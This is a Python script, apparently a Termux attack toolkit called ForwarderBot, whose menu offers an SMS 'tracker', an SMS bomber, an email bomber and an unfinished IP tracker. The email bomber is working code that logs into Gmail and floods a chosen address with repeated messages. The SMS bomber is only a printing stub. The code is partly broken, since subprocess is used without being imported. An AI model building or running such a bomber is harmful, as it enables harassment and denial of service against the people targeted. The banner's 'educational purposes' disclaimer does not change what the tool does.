import os
import time
import random
import requests
import smtplib
from colorama import Fore

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
W = Fore.WHITE

# Banner
def banner():
    os.system("clear")
    print(f"""{R}
███████╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
██╔════╝██╔════╝██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
█████╗  ██║     ██║   ██║██║ █╗ ██║███████║██║  ██║█████╗  
██╔══╝  ██║     ██║   ██║██║███╗██║██╔══██║██║  ██║██╔══╝  
██║     ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██████╔╝███████╗
╚═╝      ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
    {W}""")
    print(f"{G}Welcome to ForwarderBot!{W}")
    print(f"{Y}This tool forwards incoming SMS to Termux in real-time.{W}")
    print(f"{R}⚠ WARNING: This could be illegal! Use only for educational purposes! ⚠{W}")
    print("\n")

# Get Phone Number
def get_phone_number():
    while True:
        number = input(f"{C}Enter the phone number to track (or type 'exit' to quit): {W}")
        if number.lower() == "exit":
            print(f"{R}Exiting...{W}")
            exit()
        elif number.isdigit() and len(number) >= 8:  # Basic validation
            return number
        else:
            print(f"{R}Invalid number! Please enter a valid phone number.{W}")

# Get SMS using Termux API
def get_sms():
    result = subprocess.run(["termux-sms-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sms_list = result.stdout.decode("utf-8").strip().split("\n")
    return sms_list

# Forward SMS
def forward_sms(phone_number, message):
    print(f"{G}[+] New Message from {phone_number}: {W}{message}")

# Start Tracking
def start_tracking(phone_number):
    print(f"{Y}Tracking SMS for {phone_number}...{W}")
    print(f"{C}Press CTRL + C to stop.{W}\n")

    try:
        while True:
            sms_list = get_sms()
            for sms in sms_list:
                if "address" in sms and "body" in sms:
                    sender = sms.split(",")[0].split(":")[1].strip().strip('"')
                    body = sms.split(",")[1].split(":")[1].strip().strip('"')
                    if sender == phone_number:
                        forward_sms(sender, body)
            time.sleep(5)  # Refresh every 5 seconds
    except KeyboardInterrupt:
        print(f"{R}\nTracking stopped. Exiting...{W}")

# Email Bomber
def email_bomber():
    print(f"{Y}Enter the email to bomb:{W}")
    email = input(f"{C}Email: {W}")
    msg = input(f"{C}Message: {W}")
    email_count = int(input(f"{C}How many emails to send? {W}"))
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        email_address = input(f"{C}Enter your Gmail address: {W}")
        email_password = input(f"{C}Enter your Gmail password: {W}")
        server.login(email_address, email_password)
        
        for i in range(email_count):
            server.sendmail(email_address, email, msg)
            print(f"{G}[+] Email sent {i + 1} times!{W}")
            time.sleep(random.randint(1, 5))
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")
    finally:
        server.quit()

# SMS Bomber
def sms_bomber():
    print(f"{Y}Enter the phone number to bomb (country code + number):{W}")
    phone_number = input(f"{C}Phone Number: {W}")
    message = input(f"{C}Enter the message to send: {W}")
    number_of_sms = int(input(f"{C}Enter number of SMS to send: {W}"))
    
    for i in range(number_of_sms):
        # Replace this with actual API or service to send SMS
        print(f"{G}[+] SMS sent to {phone_number}! {i + 1}/{number_of_sms} sent{W}")
        time.sleep(random.randint(1, 3))  # Random delay for SMS bombing

# Main Function
def main():
    banner()
    input(f"{Y}Press ENTER to continue...{W}")
    
    print(f"{C}Select an option:{W}")
    print(f"{G}[1] SMS Forwarder")
    print(f"{Y}[2] SMS Bomber")
    print(f"{B}[3] Email Bomber")
    print(f"{C}[4] IP Tracker")
    choice = input(f"{W}Choose option: {C}")

    if choice == '1':
        phone_number = get_phone_number()
        start_tracking(phone_number)
    elif choice == '2':
        sms_bomber()
    elif choice == '3':
        email_bomber()
    elif choice == '4':
        print(f"{Y}IP Tracker not implemented yet!{W}")
    else:
        print(f"{R}[!] Invalid option!{W}")

# Run the main function
if __name__ == "__main__":
    main()